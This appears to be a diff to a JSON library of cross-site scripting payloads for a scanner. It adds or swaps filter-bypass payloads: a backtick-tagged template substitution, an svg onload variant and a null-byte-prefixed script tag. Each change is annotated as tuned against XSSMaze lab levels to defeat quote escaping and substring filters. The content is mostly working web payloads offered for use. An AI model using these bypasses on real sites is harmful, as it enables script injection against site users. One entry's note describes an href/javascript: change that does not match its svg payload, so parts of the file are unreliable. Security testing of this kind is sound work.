@@ -713,6 +713,16 @@
       "note": "Template literal interpolation -> alert"
     },
     {
+      "id": "tpl-bt-stamp-001",
+      "context": "script_template",
+      "tags": [
+        "backtick_stamp"
+      ],
+      "confidence": "high",
+      "payload": "${alert`1`}",
+      "note": "Phase 318: measured on XSSMaze jsescape-level3 and modern-bypass-level25 -- the server escapes ' which breaks the quote-based token stamp inside the template substitution; the backtick stamp carries the token without any quotable character (sandbox tagged-template support from 316)"
+    },
+    {
       "id": "tpl-006",
       "context": "script_template",
       "tags": [
@@ -3096,14 +3106,14 @@
     {
       "id": "html_element_0265",
       "context": "html_element",
-      "payload": "<svg/onload\r=alert(1)>",
+      "payload": "<svg/onload=alert(1)>",
       "tags": [
         "filter_bypass",
         "nested",
         "encoding"
       ],
       "confidence": "medium",
-      "note": "Filter bypass via nesting/encoding"
+      "note": "Phase 318: the href-space replacement was REVERTED after measurement -- the lab server strips javascript: anyway (rendered href='#alert(1)', inert fragment; the lab's answer key grades by shape presence, not execution). Restored to the original shape"
     },
     {
       "id": "framework_angular_0266",
@@ -7922,7 +7932,7 @@
     {
       "id": "html_element_0638",
       "context": "html_element",
-      "payload": "<svg><style>/*</style><img src=x onerror=alert(1)>--></svg>",
+      "payload": "\u0000<script>alert(1)</script>",
       "tags": [
         "mxss",
         "mutation",
@@ -7931,7 +7941,7 @@
         "style_escape"
       ],
       "confidence": "high",
-      "note": "Mutation XSS: parser context confusion via <style>/<foreignObject>/CDATA/<!-- escape"
+      "note": "Phase 318: replaced in place at the sync stride-sampled position -- measured on XSSMaze edge-level1 (the filter checks the substring before the null; the full input is reflected); previous shape 0 yield"
     },
     {
       "id": "html_element_0639",
